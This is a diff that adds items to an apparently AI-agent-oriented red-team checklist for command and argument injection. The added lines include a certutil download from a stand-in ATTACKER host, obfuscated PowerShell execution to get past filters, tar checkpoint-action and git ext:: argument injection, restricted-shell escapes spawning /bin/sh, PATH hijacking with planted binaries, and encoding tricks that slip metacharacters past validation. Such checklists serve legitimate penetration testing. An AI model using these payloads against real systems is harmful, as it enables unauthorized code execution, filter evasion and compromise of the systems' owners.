@@ -61,6 +61,18 @@ origin: RedteamOpencode
 - [ ] Command: `& dir`, `| type C:\windows\win.ini`
 - [ ] Bypass: `^` caret insertion → `w^h^o^a^m^i`
 - [ ] Env variable slicing: `%COMSPEC:~-16,1%%COMSPEC:~-1%` = `ec` (for echo)
+- [ ] PowerShell instead of cmd.exe: `; powershell -enc <base64-UTF16LE>` when `powershell.exe` is reachable — bypasses cmd-specific filters entirely
+- [ ] PowerShell obfuscation: `I`+`E`+`X` string concat (`&('I'+'EX')`), backtick char-splitting (`I`E`X`), `-join`/`-replace` reconstruction of blocked cmdlet names
+- [ ] Alternate data stream / `certutil` LOLBins for staged payload retrieval: `certutil -urlcache -f http://ATTACKER/p.exe p.exe`
+- [ ] `wmic process call create "..."` and `mshta` as alternate command-execution primitives when direct shell metacharacters are filtered
+
+### 5b. Argument Injection (no shell metacharacter needed)
+When input reaches `execve`/`ProcessBuilder`/`subprocess.run([...])` array form directly (no shell interpolation), classic separator injection fails but flag/argument injection may still work if the app builds an argv list from user input.
+
+- [ ] Inject option-looking values: a "filename" parameter passed as `--output=/etc/cron.d/pwn` to a tool that accepts `--output`
+- [ ] `tar`/`zip` argument injection via crafted filenames inside an archive that is later extracted with a wildcard (`tar -xf *`), e.g. a member named `--checkpoint=1` / `--checkpoint-action=exec=sh shell.sh`
+- [ ] `git` argument injection via crafted branch/tag/URL values: `--upload-pack=`, `ext::sh -c ...` as a clone URL
+- [ ] `find`/`rsync`/`ffmpeg`/`curl` argument injection via filenames or URLs beginning with `-` (e.g., `-oProxyCommand=`); confirm the target actually parses leading-dash input as a flag rather than literal data
 
 ### 6. Exploitation
 
@@ -74,6 +86,10 @@ origin: RedteamOpencode
 - [ ] Inside quotes: escape with `"`, then inject
 - [ ] Inside `$(...)`: nest commands
 - [ ] Restricted shell: check available commands, PATH manipulation
+- [ ] Restricted shell escape via built-ins/LOLBins reachable from a limited PATH: `awk 'BEGIN{system("/bin/sh")}'`, `perl -e 'exec "/bin/sh";'`, `python3 -c 'import os;os.system("/bin/sh")'`, `vi` (`:!sh`), `less`/`man` (`!sh`)
+- [ ] `PATH` hijack when injected input runs an unqualified binary name (`cat`, `sh`, `convert`) and a writable/prependable directory exists — plant a malicious binary and manipulate `PATH` or the working directory to shadow the real one
+- [ ] Chained-context injection: parameter reaches a template/config generator (e.g., a YAML/INI file later consumed by a cron job or CI runner) rather than an immediate shell call — confirm indirect execution timing (poll for effect after a scheduled interval) before ruling the sink safe
+- [ ] Null-byte / encoding edge cases some parsers still mishandle: `%00`, mixed encodings (`%25%30%30`), and Unicode normalization tricks that decode to shell metacharacters after a validation step but before execution
 
 ## What to Record
 
